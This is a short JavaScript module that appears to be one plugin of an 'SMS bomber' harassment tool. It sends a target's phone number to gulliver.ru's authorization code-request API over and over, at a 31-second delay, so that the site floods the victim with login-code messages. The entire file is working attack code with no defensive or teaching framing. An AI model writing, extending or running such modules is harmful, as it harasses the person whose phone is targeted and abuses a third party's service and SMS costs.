const Bomber = require("../bomber");
const requestTypes = require("../../data-structures/requestTypes");

class GuliverBomber extends Bomber {
    constructor(phone){
        super(phone);
        this.data = {
            phone: this.phone,
            token: "66e29bc89c9c780ba41ba4652b5ce2419199b01654b7fc13a1c38788a99f107366e29bc89c9c780ba41ba4652b5ce24166e29bc89c9c780ba41ba4652b5ce2419199b01654b7fc13a1c38788a99f107366e29bc89c9c780ba41ba4652b5ce2419199b01654b7fc13a1c38788a99f107366e29bc89c9c780ba41ba4652b5ce24166e29bc89c9c780ba41ba4652b5ce2419199b01654b7fc13a1c38788a99f107366e29bc89c9c780ba41ba4652b5ce2419199b01654b7fc13a1c38788a99f107366e29bc89c9c780ba41ba4652b5ce2419199b01654b7fc13a1c38788a99f107366e29bc89c9c780ba41ba4652b5ce241"
        };
    }
    headers = {
    }
    requestType = requestTypes.post;
    static country = "RU";
    siteName = "guliver";
    delay = 31000;
    url = `https://www.gulliver.ru/api/authorization/phone/code_request`;  
}
module.exports = GuliverBomber;